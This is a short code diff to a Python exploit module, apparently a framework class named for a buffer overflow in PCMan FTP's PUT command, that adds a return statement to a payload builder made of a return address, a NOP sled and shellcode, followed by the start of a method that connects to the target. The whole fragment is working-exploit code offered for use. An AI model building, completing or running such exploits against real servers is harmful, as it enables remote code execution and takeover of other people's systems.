@@ -7,6 +7,7 @@ class pcmanPutOverflowMenu(core.Exploit):
     p += "\x77\xc3\x54\x59"
     p += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
     p += self.get_shellcode()
+    return p
   def deliver(self, p)
     self.init_deliver()
     s = self.connect()
